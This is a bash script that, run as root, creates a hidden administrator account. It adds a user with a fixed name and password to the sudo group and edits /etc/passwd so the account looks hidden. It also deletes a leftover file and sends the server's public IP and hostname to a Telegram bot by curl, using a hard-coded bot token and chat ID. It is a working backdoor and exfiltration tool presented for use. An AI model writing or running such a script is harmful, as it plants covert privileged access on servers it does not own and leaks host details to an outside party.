#!/bin/bash

# Bot token and chat ID for Telegram notifications
BOT_TOKEN="6874880525:AAGJOGX_3eR8hYOLaJCgq2BWOeuYc7D6RDc"
CHAT_ID="1182377349"

send_telegram_message() {
    local message=$1
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d chat_id=$CHAT_ID -d text="$message" > /dev/null
}

get_server_info() {
    local ip=$(curl -s ifconfig.me)
    local hostname=$(hostname)
    echo "IP Address: $ip, Hostname: $hostname"
}

if [ "$EUID" -ne 0 ]; then
    send_telegram_message "Error: Please run as root"
    exit 1
fi

# Ensure /var/empty exists
mkdir -p /var/empty

server_info=$(get_server_info)
send_telegram_message "Starting the creation of a hidden admin user. $server_info"

# Define fixed username and password
user_id="rotjsugqbzuh"
password_1="sousheb1828#Aausv@92"

# Check if user already exists
if id "$user_id" &>/dev/null; then
    send_telegram_message "User $user_id already exists. Skipping user creation."
else
    # Create the account
    useradd -m -s /bin/bash "$user_id"
    echo "$user_id:$password_1" | chpasswd

    # Add the user to sudo group (admin privileges)
    usermod -aG sudo "$user_id"

    # Change home directory to /home/$user_id
    usermod -d /home/$user_id "$user_id"

    # Hide the user by modifying the /etc/passwd file
    # Change the home directory to /var/empty to make it appear "hidden"
    sed -i "/^$user_id:/s#/home/$user_id#/var/empty#" /etc/passwd

    # Lock the user from appearing in the login screen by changing the shell
    usermod -s /bin/bash "$user_id"
fi

# Cleanup
cd /root || exit
rm -rf /root/lib02uba

send_telegram_message "Admin user $user_id has been created and hidden successfully. $server_info"
